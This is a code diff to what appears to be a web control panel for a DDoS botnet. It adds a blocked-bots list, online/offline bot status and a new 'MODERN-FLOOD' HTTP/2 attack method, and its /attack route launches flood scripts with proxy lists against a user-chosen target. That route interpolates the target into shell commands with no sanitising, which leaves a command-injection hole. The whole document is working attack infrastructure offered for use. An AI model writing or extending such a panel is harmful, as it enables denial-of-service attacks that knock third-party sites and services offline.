@@ -90,6 +90,20 @@ app.get('/', (req, res) => {
                     </div>
                 </div>
 
+                <!-- Blocked Bots List -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
+                    <div class="bg-gradient-to-r from-red-900/50 to-orange-900/50 px-6 py-4 border-b border-gray-700">
+                        <h2 class="text-xl font-bold flex items-center gap-2">
+                            <span>🚫</span> Blocked Bots
+                        </h2>
+                    </div>
+                    <div class="p-6">
+                        <div id="blockedList" class="space-y-2 max-h-48 overflow-y-auto">
+                            <p class="text-gray-500 text-center py-4 text-sm">No blocked bots</p>
+                        </div>
+                    </div>
+                </div>
+
                 <!-- Attack Control -->
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                     <div class="bg-gradient-to-r from-red-900/50 to-purple-900/50 px-6 py-4 border-b border-gray-700">
@@ -116,6 +130,7 @@ app.get('/', (req, res) => {
                                 <label class="block text-sm font-medium text-gray-300 mb-2">💣 Attack Method</label>
                                 <select id="method" 
                                     class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50">
+                                    <option>MODERN-FLOOD</option>
                                     <option>HTTP-SICARIO</option>
                                     <option>RAW-HTTP</option>
                                     <option>R9</option>
@@ -210,6 +225,10 @@ app.get('/', (req, res) => {
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                     <h3 class="text-lg font-bold mb-4">📋 Attack Methods</h3>
                     <div class="space-y-2 text-xs">
+                        <div class="bg-gray-900 p-2 rounded border border-cyan-900/30">
+                            <div class="text-cyan-400 font-bold">MODERN-FLOOD</div>
+                            <div class="text-gray-500 text-xs mt-1">⭐ NEW! HTTP/2 + vulnerabilities</div>
+                        </div>
                         <div class="bg-gray-900 p-2 rounded border border-red-900/30">
                             <div class="text-red-400 font-bold">HTTP-SICARIO</div>
                         </div>
@@ -236,6 +255,7 @@ app.get('/', (req, res) => {
 
     <script>
         let bots = [];
+        let blockedBots = [];
         let totalAttacks = 0;
         let activeAttacks = 0;
         let startTime = Date.now();
@@ -253,6 +273,7 @@ app.get('/', (req, res) => {
         // Auto-refresh bot list every 5 seconds
         setInterval(() => {
             refreshBots();
+            refreshBlockedBots();
         }, 5000);
 
         function updateStats() {
@@ -262,6 +283,27 @@ app.get('/', (req, res) => {
             document.getElementById('activeAttacks').textContent = activeAttacks;
         }
 
+        function renderBlockedBots() {
+            const blockedList = document.getElementById('blockedList');
+            if (blockedBots.length === 0) {
+                blockedList.innerHTML = '<p class="text-gray-500 text-center py-4 text-sm">No blocked bots</p>';
+                return;
+            }
+
+            blockedList.innerHTML = blockedBots.map((botUrl, index) => \`
+                <div class="bg-gray-900 p-3 rounded-lg border border-red-900/30 flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <div class="w-2 h-2 bg-red-500 rounded-full"></div>
+                        <div class="text-white font-mono text-xs">\${botUrl}</div>
+                    </div>
+                    <button onclick="unblockBot('\${botUrl}')" 
+                        class="text-green-400 hover:text-green-300 text-xs px-2 py-1 bg-green-900/30 rounded">
+                        Unblock
+                    </button>
+                </div>
+            \`).join('');
+        }
+
         function renderBots() {
             const botsList = document.getElementById('botsList');
             if (bots.length === 0) {
@@ -269,13 +311,24 @@ app.get('/', (req, res) => {
                 return;
             }
 
-            botsList.innerHTML = bots.map((bot, index) => \`
+            const now = Date.now();
+
+            botsList.innerHTML = bots.map((bot, index) => {
+                const timeSinceLastSeen = now - (bot.lastSeen || now);
+                const isOnline = timeSinceLastSeen < 60000; // Online if seen in last 60 seconds
+                const statusColor = isOnline ? 'bg-green-500' : 'bg-red-500';
+                const statusText = isOnline ? 'Online' : 'Offline';
+                const statusTextColor = isOnline ? 'text-green-400' : 'text-red-400';
+                
+                return \`
                 <div class="bg-gray-900 p-4 rounded-lg border border-gray-700 flex items-center justify-between">
                     <div class="flex items-center gap-3">
-                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                        <div class="w-2 h-2 \${statusColor} rounded-full \${isOnline ? 'animate-pulse' : ''}"></div>
                         <div>
                             <div class="text-white font-mono text-sm">\${bot.url}</div>
-                            <div class="text-xs text-gray-500">Bot #\${index + 1} | Auto-approved at \${bot.time}</div>
+                            <div class="text-xs text-gray-500">
+                                Bot #\${index + 1} | <span class="\${statusTextColor}">\${statusText}</span> | Registered: \${bot.time}
+                            </div>
                         </div>
                     </div>
                     <div class="flex gap-2">
@@ -289,7 +342,8 @@ app.get('/', (req, res) => {
                         </button>
                     </div>
                 </div>
-            \`).join('');
+            \`;
+            }).join('');
         }
 
         function removeBot(index) {
@@ -315,12 +369,33 @@ app.get('/', (req, res) => {
                     bots.splice(index, 1);
                     renderBots();
                     updateStats();
+                    refreshBlockedBots();
                     addLog(\`✅ Bot permanently blocked: \${bot.url}\`, 'success');
                 } else {
                     addLog(\`❌ Failed to block bot: \${data.error}\`, 'error');
                 }
             } catch (error) {
                 addLog(\`❌ Error blocking bot: \${error.message}\`, 'error');
+            }
+        }
+
+        async function unblockBot(botUrl) {
+            if (!confirm(\`Unblock this bot?\n\n\${botUrl}\n\nThe bot will be able to reconnect.\`)) {
+                return;
+            }
+
+            try {
+                const response = await fetch(\`/unblock-bot?bot=\${encodeURIComponent(botUrl)}\`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    refreshBlockedBots();
+                    addLog(\`✅ Bot unblocked: \${botUrl}\`, 'success');
+                } else {
+                    addLog(\`❌ Failed to unblock bot: \${data.error}\`, 'error');
+                }
+            } catch (error) {
+                addLog(\`❌ Error unblocking bot: \${error.message}\`, 'error');
             }
         }
 
@@ -342,6 +417,17 @@ app.get('/', (req, res) => {
                 updateStats();
             } catch (error) {
                 console.error('Failed to refresh bots:', error);
+            }
+        }
+
+        async function refreshBlockedBots() {
+            try {
+                const response = await fetch('/blocked');
+                const data = await response.json();
+                blockedBots = data.blocked;
+                renderBlockedBots();
+            } catch (error) {
+                console.error('Failed to refresh blocked bots:', error);
             }
         }
 
@@ -515,6 +601,7 @@ app.get('/', (req, res) => {
 
         // Initial bot list load
         refreshBots();
+        refreshBlockedBots();
     </script>
 </body>
 </html>
@@ -745,7 +832,11 @@ app.get('/attack', (req, res) => {
     });
   };
 
-  if (methods === 'HTTP-SICARIO') {
+  if (methods === 'MODERN-FLOOD') {
+    console.log('✅ Executing MODERN-FLOOD');
+    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64`);
+  }
+  else if (methods === 'HTTP-SICARIO') {
     console.log('✅ Executing HTTP-SICARIO');
     execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
     execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
